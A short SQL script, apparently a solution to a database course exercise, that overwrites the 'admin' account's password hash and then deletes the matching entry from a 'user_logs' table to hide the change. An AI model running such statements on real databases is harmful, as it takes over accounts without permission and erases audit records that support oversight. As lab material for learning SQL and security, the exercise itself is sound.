-- Set admin's password to the same password as user emily33
UPDATE "users"
SET "password" = (
    SELECT "password"
    FROM "users"
    WHERE "username" = 'emily33'
)
WHERE "username" = 'admin';

-- Set admin’s password to the hash of 'oops!'
UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- Remove the record of the last password update
DELETE FROM "user_logs"
WHERE "type" = 'update' AND "new_password" = '982c0381c279d139fd221fce974916e7';